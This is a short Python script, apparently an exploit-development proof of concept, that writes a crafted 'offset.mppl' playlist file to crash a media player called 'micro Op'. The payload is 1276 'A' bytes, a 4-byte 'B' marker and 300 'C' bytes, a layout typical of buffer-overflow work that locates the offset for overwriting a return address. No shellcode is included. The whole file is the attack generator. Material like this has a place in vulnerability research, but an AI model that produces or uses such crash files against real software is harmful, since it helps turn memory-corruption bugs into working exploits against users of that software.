#!/usr/bin/python

#micro Op crashing mppl file crashing script

file =open("offset.mppl", "wb")

buffer ="A" * 1276 + "B" * 4 + "C" * 300

file.write(buffer)

file.close()

